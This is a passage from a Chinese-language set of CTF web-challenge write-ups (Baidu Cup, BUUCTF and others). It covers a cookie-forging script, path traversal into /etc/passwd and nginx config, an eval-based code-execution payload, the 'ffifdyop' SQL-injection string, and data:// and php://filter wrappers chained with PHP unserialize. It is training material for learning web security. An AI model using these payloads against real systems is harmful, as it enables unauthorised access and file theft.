        $tmp .= chr(ord($txt[$i])+10);//txt变量的个个位数上的数字or字母的ascii码+10
    }
    $txt = $tmp;
    $rnd=random(4);//生成随机数
    $key=md5($rnd.$key);//加密key值
    $s=0;
    for($i=0;$i<strlen($txt);$i++){
        if($s == 32) $s = 0;
        $ttmp .= $txt[$i] ^ $key[++$s];
    }
    return base64_encode($rnd.$ttmp);
}
function decrypt($txt,$key){
    $txt=base64_decode($txt);
    $rnd = substr($txt,0,4);
    $txt = substr($txt,4);
    $key=md5($rnd.$key);

    $s=0;
    for($i=0;$i<strlen($txt);$i++){
        if($s == 32) 
            $s = 0;
        $tmp .= $txt[$i]^$key[++$s];	//$a ^ $b 	Xor（按位异或） 	将把 $a 和 $b 中一个为 1 另一个为 0 的位设为 1。
    }
    for($i=0;$i<strlen($tmp);$i++){
        $tmp1 .= chr(ord($tmp[$i])-10);
    }
    return $tmp1;
}
$username = decrypt($_COOKIE['user'],$key);
if ($username == 'system'){	//username='system'时输出flag
    echo $flag;
}else{
    setcookie('user',encrypt('guest',$key));
    echo "â®(â¯â½â°)â­";
}
?>
~~~

现在我们需要获取key值，可以利用eles代码段里执行得到结果获得key。访问fl3g_ichuqiu.php文件，获得 `encrypt('guest',$key)`得到的`setcookie`值

![image-20210511163942294](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210511163942294.png)





编写脚本文件，返回`system`的编码值

~~~php
<?php
    $txt1 = 'guest';
    for ($i = 0; $i < strlen($txt1); $i++) {
        $txt1[$i] = chr(ord($txt1[$i])+10);
    }
    $cookie_guest = 'dUptNkYaWh5M'; //自己浏览器guest返回的set-cookie值
    $cookie_guest = base64_decode($cookie_guest);
    $rnd = substr($cookie_guest,0,4); 
    $ttmp = substr($cookie_guest,4);
    $key='';
    for ($i = 0; $i < strlen($txt1); $i++) {
        $key .= ($txt1[$i] ^ $ttmp[$i]);//$key=md5($rnd.$key);
    }

    $txt2 = 'system';
    for ($i = 0; $i < strlen($txt2); $i++) {
        $txt2[$i] = chr(ord($txt2[$i])+10);
    }

    $md5 = '0123456789abcdef';
    for ($i = 0; $i < strlen($md5); $i++) {
        $key_new = $key.$md5[$i];
        $cookie_system='';
        for ($j = 0; $j < strlen($txt2); $j++) {
            $cookie_system .= ($key_new[$j] ^ $txt2[$j]);
        }
        $cookie_system = base64_encode($rnd.$cookie_system);
        echo $cookie_system."</br>";
    }  
?>
~~~

得到许多的base64编码值，用burp爆破出正确的cookie：user=？值，得到flag值

### “百度杯”CTF比赛 2017 二月场——Zone

![image-20210505130934079](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210505130934079.png)

进入页面是一个登录页面，抓包登录试试，看到cookie里有一个login=0，改成1试试，结果和正常一样。

![image-20210511203125993](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210511203125993.png)

扫一下目录结构，发现了许多文件，其中就包括flag.php

![image-20210511203226956](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210511203226956.png)

进入flag.php页面只显示了flag_is_here，估计flag值是在源码中，现在就是想办法获取flag.php文件的源码。

试试从index.php页面抓包修改login=1,成功进入管理员页面

![image-20210511203510988](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210511203510988.png)

点击Manage，发现url地址存在参数，怀疑是文件包含

![image-20210511203627136](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210511203627136.png)

修改index为flag，果然可以看到flag.php的文件显示，但是还是看不到源码。去访问/etc/passwd文件。并没有任何显示，是不是过滤了 `../`符号，用 `..././`绕过试试，成功回显信息。

![image-20210511204222007](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210511204222007.png)

**注意：这里我踩了一个坑，name参数后面的php后缀名要删除掉，不然不会回显任何信息**

接下来自己看的别人的WP，没有思路了……

我们在最后一行看到了nginx。我们去看一下nginx的配置文件。nginx的配置文件位置可能不太一样，不过在/etc/nginx/nginx.conf的可能性比较大。我们尝试访问一下，成功了：

![image-20210511204521857](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210511204521857.png)



![image-20210511204608599](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210511204608599.png)

注意最后一行包含的sites-enabled/default.进入之后发现了目录遍历的漏洞：

![image-20210511204822110](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210511204822110.png)



~~~
location /online-movies {
            alias /movie/;
            autoindex on;
        }
~~~

这里边的 autoindex on ，即为允许目录浏览。因此我们可以进行目录遍历了。 怎么遍历呢？我们直接访问/online-movies. ./，因为alias /movie/，因为会变成 /movie/. ./，我们访问试试：

![image-20210511205218905](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210511205218905.png)

成功显示了flag值。通过本题学习了中间件的目录访问

### “百度杯”2017年春秋欢乐赛——象棋（未写WP）

![image-20210505134028040](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210505134028040.png)

查看源代码，发现了了一个特别的js文件

![image-20210511205747009](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210511205747009.png)



猜想是不是正确猜出js文件的名字，然后访问此文件，获得下一步的线索。文件名是一个正则表达式，写个py脚本，然后用python脚本写个请求爆破一下吧

~~~python
#js文件名脚本，哈哈简单粗暴，五个for循环
pre_str='abcmlyx'
hou_str='0123456789'
for i in pre_str:
    for j in pre_str:
        pre = i+j+'ctf'
        for a in hou_str:
            for b in hou_str:
                for c in hou_str:
                    print(pre+a+b+c)
                    with open(r'ctf_str.txt', 'a+', encoding='utf-8') as f:
                        f.write(pre+a+b+c + '\n')
                        f.close()
~~~

~~~python
# 请求脚本
def bp():
    url='http://353e7b03144049c18a362f7dd41d8832df76c8b4bcec4b49.changame.ichunqiu.com/js/'
    try:
        for i in open('ctf_str.txt'):
            i = i.replace('\n','')
            html = requests.get(url+i+'.js').status_code
            if(html==200):
                print(i)
            # sleep(0.5)
            print(url+i+'.js'+"         "+str(html))
    except :
        pass
~~~

静静等待结果吧







### 第一届“百度杯”信息安全攻防总决赛 线上选拔赛——Upload







### “百度杯”CTF比赛 十月场——GetFlag

~~~php
<?php
$f = $_POST['flag'];
$f = str_replace(array('`', '$', '*', '#', ':', '\\', '"', "'", '(', ')', '.', '>'), '', $f);
if((strlen($f) > 13) || (false !== stripos($f, 'return')))//$f长度小于13并且内容不包含‘return’
{
		die('wowwwwwwwwwwwwwwwwwwwwwwwww');
}
try
{
		 eval("\$spaceone = $f");
}
catch (Exception $e)
{
		return false;
}
if ($spaceone === 'flag'){
	echo file_get_contents("helloctf.php");
}

?>
 
~~~



百度了一样PHP字符串的表示方法，之后发现字符串还有一种表示方法叫做Heredoc，不包含引号，于是构造flag参数如图，因为包含换行，所以需要url编码

~~~
<<<s
flag
s;

~~~

### “百度杯”CTF比赛 十月场——Not Found

![image-20210506202653751](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210506202653751.png)

> 1   GET  发送请求来获得服务器上的资源，请求体中不会包含请求数据，请求数据放在协议头中。另外get支持快取、缓存、可保留书签等。幂等
>
> 2   POST  和get一样很常见，向服务器提交资源让服务器处理，比如提交表单、上传文件等，可能导致建立新的资源或者对原有资源的修改。提交的资源放在请求体中。不支持快取。非幂等
>
> 3   HEAD  本质和get一样，但是响应中没有呈现数据，而是http的头信息，主要用来检查资源或超链接的有效性或是否可以可达、检查网页是否被串改或更新，获取头信息等，特别适用在有限的速度和带宽下。
>
>   4   PUT  和post类似，html表单不支持，发送资源与服务器，并存储在服务器指定位置，要求客户端事先知
>
> 道该位置；比如post是在一个集合上（/province），而put是具体某一个资源上（/province/123）。所以put是安全的，无论请求多少次，都是在123上更改，而post可能请求几次创建了几次资源。幂等
>
> 5   DELETE   请求服务器删除某资源。和put都具有破坏性，可能被防火墙拦截。如果是https协议，则无需担心。幂等   
>
> 6   CONNECT  HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。就是把服务器作为跳板，去访问其他网页然后把数据返回回来，连接成功后，就可以正常的get、post了。
>
> 7   OPTIONS   获取http服务器支持的http请求方法，允许客户端查看服务器的性能，比如ajax跨域时的预检等。   
>
> 8   TRACE  回显服务器收到的请求，主要用于测试或诊断。一般禁用，防止被恶意攻击

### “百度杯”CTF比赛 十月场——fuzzing

![image-20210506204654898](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210506204654898.png)

> key is not right,md5(key)==="1b4167610ba3f2ac426a68488dbd89be",and the key is ichunqiu***,the * is in [a-z0-9]

### “百度杯”CTF比赛 十月场——Hash

![image-20210507084430919](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210507084430919.png)

~~~php
<?php
class Demo {
    private $file = 'Gu3ss_m3_h2h2.php';

    public function __construct($file) {
        $this->file = $file;
    }

    function __destruct() {
        echo @highlight_file($this->file, true);
    }

    function __wakeup() {
        if ($this->file != 'Gu3ss_m3_h2h2.php') {
            //the secret is in the f15g_1s_here.php
            $this->file = 'Gu3ss_m3_h2h2.php';
        }
    }
}

if (isset($_GET['var'])) {
    $var = base64_decode($_GET['var']);//传递参数base64解码
    if (preg_match('/[oc]:\d+:/i', $var)) { //正则匹配，/i表示忽略大小写，防止大小写绕过
        die('stop hacking!');
    } else {

        @unserialize($var);
    }
} else {
    highlight_file("Gu3ss_m3_h2h2.php");
}
?> 
~~~



~~~php
<?php
if (isset($_GET['val'])) {
    $val = $_GET['val'];
    eval('$value="' . addslashes($val) . '";');
} else {
    die('hahaha!');
}

?> 
~~~



val=${eval($_POST[0])}

### [极客大挑战 2019]Havefun 1

![image-20210507103243907](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210507103243907.png)

​							 			

![image-20210507103345039](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210507103345039.png)

​							 					

### [SUCTF 2019]EasySQL 1

![image-20210507105339870](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210507105339870.png)

### [ACTF2020 新生赛]Include 1

![image-20210507112302338](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210507112302338.png)

### [极客大挑战 2019]Secret File 1

![image-20210507112433680](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210507112433680.png)

~~~php
<html>
    <title>secret</title>
    <meta charset="UTF-8">
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file); 
//flag放在了flag.php里
?>
</html>
~~~

### [极客大挑战 2019]LoveSQL 1

简单，利用information_schema库

### [ACTF2020 新生赛]Exec 1

超级简单，RCE 

Payload: 

![image-20210507194417743](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210507194417743.png)

### GXYCTF2019]Ping Ping Ping

![image-20210507194557084](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210507194557084.png)

远程命令执行&内联执行

内联，就是将反引号内命令的输出作为输入执行

https://blog.csdn.net/vanarrow/article/details/108295481

### [极客大挑战 2019]Knife

简单，略过

### [护网杯 2018]easy_tornado

![image-20210508093548461](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210508093548461.png)

线索

![image-20210508093716495](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210508093716495.png)

flag位置

![image-20210508093740677](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210508093740677.png)

> 思路：先用线索构造flag所在位置的md5值
>
> ​	 fllllllllllllag：md5值 594cb6af684ad354b4a59ac496473990
>
> ​	cookie_secret+md5(filename)：md5值 
>
> ​	cookie_secret没找到，百度一下吧，唉，原来是模板注入，提示在/welcome.txt里面，render
>
> ​	36277246-f3aa-4cea-a784-115ecefa55a2+594cb6af684ad354b4a59ac496473990.后来发现原来filename=/ fllllllllllllag，得加上/         严谨啊
>
> md5(36277246-f3aa-4cea-a784-115ecefa55a2+3bf9f6cf685a6dd8defadabfb41a03a1)最终得出flag

### [RoarCTF 2019]Easy Calc

源代码内容：

~~~js
<!--I've set up WAF to ensure security.-->
<script>
    $('#calc').submit(function(){
        $.ajax({
            url:"calc.php?num="+encodeURIComponent($("#content").val()),
            type:'GET',
            success:function(data){
                $("#result").html(`<div class="alert alert-success">
            <strong>答案:</strong>${data}
            </div>`);
            },
            error:function(){
                alert("这啥?算不来!");
            }
        })
        return false;
    })
</script>

~~~

**利用PHP的字符串解析特性**

### [极客大挑战 2019]PHP

**private** 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，**类名和字段名前面都会加上\0的前缀**。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。

**当反序列化字符串，表示属性个数的值大于真实属性个数时，会跳过 __wakeup 函数的执行。**

### [极客大挑战 2019]Upload

### [极客大挑战 2019]BabySQL

![image-20210510115359835](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210510115359835.png)





并不在当前数据库

### [ACTF2020 新生赛]Upload

![image-20210510111833218](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210510111833218.png)

白名单限制&前端限制：

![image-20210510111923779](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210510111923779.png)

### [ACTF2020 新生赛]BackupFile

![image-20210510113407203](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210510113407203.png)

~~~php
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}


~~~



源码的意思是传一个key参数，这个参数必须是整数，然后和str字符串比较，int和string是无法直接比较的，php会将string转换成int然后再进行比较，转换成int比较时只保留数字，第一个字符串之后的所有内容会被截掉，双等属于弱类型比较。所以只需要key=123就行了。

### [HCTF 2018]admin（*）

![image-20210510150346033](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210510150346033.png)

https://blog.csdn.net/weixin_44677409/article/details/100733581

### [极客大挑战 2019]BuyFlag

~~~php

	//~~~post money and password~~~
if (isset($_POST['password'])) {
	$password = $_POST['password'];
	if (is_numeric($password)) {
		echo "password can't be number</br>";
	}elseif ($password == 404) {
		echo "Password Right!</br>";
	}
}

~~~

https://blog.csdn.net/weixin_44348894/article/details/105333137

### [BJDCTF2020]Easy MD5

进入网站

![image-20210513105322411](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210513105322411.png)

抓包发现了个线索，一个SQL语句,这里可以确定是SQL注入了，但是和MD5编码相关

![image-20210513105758984](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210513105758984.png)



~~~sql
select * from 'admin' where password=md5($pass,true)
~~~

  **md5(string,raw\)**

| 参数   | 描述                                                         |
| ------ | ------------------------------------------------------------ |
| string | 必需。要计算的字符串                                         |
| raw    | 可选。 默认不写为FALSE，32位16进制的字符串；TRUE，16位原始二进制格式的字符串。 |



**md5(string,true)函数在指定了true的时候，是返回的原始 16 字符二进制格式。  这里需要注意的是，当raw项为true时，返回的这个原始二进制不是普通的二进制（0，1），而是 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c 这种。**

~~~php
    content: ffifdyop
    hex: 276f722736c95d99e921722cf9ed621c
    raw: 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c
    string: 'or'6]!r,b
~~~

 这里32位的16进制的字符串，两个一组就是上面的16位二进制的字符串。比如27，这是16进制的，先要转化为10进制的，就是39，39在ASC码表里面就是 `'` 字符。6f就是对应`  o  `。

**这不是普通的二进制字符串，而是’or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c 这种。这样的话就会和前面的形成闭合，构成万能密码。**

~~~sql
select * from 'admin' where password=''or'6.......'
~~~

这就是永真的了，这就是一个万能密码了相当于1’ or 1=1#或1’ or 1#。接下来就是找到这样子的字符串。而上面的字符串 `ffifdyop`就是其中一个payload，就可以直接用了

但是我们思考一下为什么6\xc9]\x99\xe9!r,\xf9\xedb\x1c的布尔值是true呢？

>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数（这类似于PHP的弱类型）。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。这里不只是1开头，只要是数字开头都是可以的。当然如果只有数字的话，就不需要单引号，比如password=‘xxx’ or 1，那么返回值也是true。（xxx指代任意字符）

我们输入这个ffifdyop字符串以后出现以下的页面：

![image-20210513114017635](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210513114017635.png)



查看源码发现以下内容

~~~php
<!--
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
-->
~~~

代码的意思就是a，b两个参数要不相等，但是呢他们两个的MD5值需要相等。这里我想的是估计又是要利用PHP弱类型的缺陷绕过了。

**md5()**

```php
$array1[] = array(
 "foo" => "bar",
 "bar" => "foo",
);
$array2 = array("foo", "bar", "hello", "world");
var_dump(md5($array1)==md5($array2)); //true
```

PHP 手册中的 md5（）函数的描述是 `string md5 ( string $str [, bool $raw_output = false ] )`，`md5()` 中的需要是一个 string 类型的参数。但是当你传递一个 array 时，`md5()` 不会报错，只是会无法正确地求出 array 的 md5 值，这样就会导致任意 2 个 array 的 md5 值都会相等。

以上内容是我在web篇总结的，正好用到此处，PHP内置函数的松散性，利用数组绕过。

这个题的payload估计是传递两个数组参数，虽然传递的数组内容值不一样，但是两个数组的md5值也会相等

成功到达下一步

![image-20210513114738649](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210513114738649.png)

看这一步的代码是用post方法传递数值，绕过方式和上一步一样，得到flag值

![image-20210513115227768](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210513115227768.png)

### [ZJCTF 2019]NiZhuanSiWei

进入网站，出现了代码，开始代码审计吧

~~~php
 <?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
//
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?> 
~~~

**第一个绕过：**

~~~php
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf"))
~~~

​	这里需要我们传入一个文件且其内容为welcome to the zjctf，这样的话才能继续往下一步走，现在就剩下一个data伪协议。data协议通常是用来执行PHP代码，然而我们也可以将内容写入data协议中然后让file_get_contents函数读取文件。构造如下，

~~~php
text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=
~~~

当然也可以不需要base64，但是一般为了绕过某些过滤都会用到base64。data://text/plain,welcome to the zjctf

**第二个绕过**

~~~php
$file = $_GET["file"];
if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
~~~

这里有file参数可控，但是无法直接读取flag，可以直接读取/etc/passwd，但针对php文件我们需要进行base64编码，否则读取不到其内容，所以以下无法使用：

~~~
file=useless.php
~~~

所以下面采用filter来读源码，但上面提到过针对php文件需要base64编码，所以使用其自带的base64过滤器。

```php
php://filter/read=convert.base64-encode/resource=useless.php
```

读到的useless.php内容如下：

~~~php
<?php  

class Flag{  //flag.php  
    public $file="flag.php";  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  

~~~

**第三个绕过**

~~~php
$password = $_GET["password"];
include($file);  //useless.php
$password = unserialize($password);
echo $password;
~~~

这里的file是我们可控的，所以在本地测试后有执行下面代码即可出现payload：

```
<?php  
class Flag{  //flag.php  
    public $file="flag.php";  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
$a = new Flag();
echo serialize($a);
?>
//O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

最后payload

~~~http
http://738ae58a-c99d-45f0-87d0-f65b27ff87f8.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:"Flag":1:%7Bs:4:"file";s:8:"flag.php";%7D
~~~

最终获得flag值

![image-20210513150311612](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210513150311612.png)

### [网鼎杯 2018]Fakebook（*）

![image-20210513151443501](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210513151443501.png)

试了一遍各个功能，没有发现什么异常，没有思路，看看别人的WP吧

扫描目录发现了/robots.txt，打开发现了/user.php.bak，下载下来是PHP代码

~~~php
<?php
class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";
    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }
    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }
    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }
}
~~~

开始代码审计

https://www.freesion.com/article/4631470744/

